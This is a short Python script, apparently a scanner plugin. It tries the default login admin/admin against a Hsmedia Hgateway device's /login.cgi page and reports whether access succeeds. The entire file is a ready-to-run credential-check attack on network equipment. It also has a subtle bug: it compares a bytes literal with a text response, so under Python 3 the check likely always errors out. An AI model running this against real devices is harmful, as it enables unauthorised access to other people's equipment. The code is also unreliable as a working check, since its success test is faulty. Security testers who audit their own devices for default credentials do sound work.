#encoding:utf-8
try:
    import requests,os,sys,logging
    logging.basicConfig(level=logging.INFO,format="%(message)s")
except Exception as e:
    logging.info("[*] {}".format(e))
    os._exit(6)

def check(ip,port):
    target = "http://" + ip + ":" + port
    payload = "/login.cgi"
    header = {"Content-Type": "application/x-www-form-urlencoded"}
    data = "user=admin&password=admin"
    try:
        req = requests.post(url=target + payload,headers=header,data=data,timeout=3)

        if req.status_code == 200:
            if (b'flag=0' in req.text):
                logging.info("[+] {} find Hsmedia_Hgateway_Default_account".format(ip))
                os._exit(1)

        logging.info("[-] {} do not found Hsmedia_Hgateway_Default_account".format(ip))
        os._exit(2)
    except Exception as e:
        logging.info("[*] {}".format(e))
        os._exit(4)

if __name__== "__main__":
    ip = sys.argv[1]
    port = sys.argv[2]
    check(ip,port)